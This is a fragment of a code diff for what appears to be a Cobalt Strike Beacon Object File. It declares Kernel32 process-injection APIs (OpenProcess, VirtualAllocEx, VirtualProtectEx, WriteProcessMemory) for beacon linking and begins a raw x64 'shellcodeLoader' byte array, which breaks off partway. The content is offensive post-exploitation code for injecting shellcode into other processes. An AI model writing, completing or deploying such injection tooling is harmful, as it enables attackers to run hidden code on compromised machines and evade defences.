@@ -3,6 +3,29 @@
 #include <stddef.h>
 #include "beacon.h"
 
+// needed to resolve beacon linker errors
+void ___chkstk_ms() { }
+
+// BOF definitions for beacon linking
+WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
+WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
+WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
+WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
+
+// function name definitions for ease of use
+#define GetModuleHandleA        KERNEL32$GetModuleHandleA
+#define GetProcAddress          KERNEL32$GetProcAddress
+#define OpenProcess             KERNEL32$OpenProcess
+#define VirtualAllocEx          KERNEL32$VirtualAllocEx
+#define VirtualProtectEx        KERNEL32$VirtualProtectEx
+#define WriteProcessMemory      KERNEL32$WriteProcessMemory
+#define GetLastError            KERNEL32$GetLastError
+#define CloseHandle             KERNEL32$CloseHandle
+
 unsigned char shellcodeLoader[] =
 {
         0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
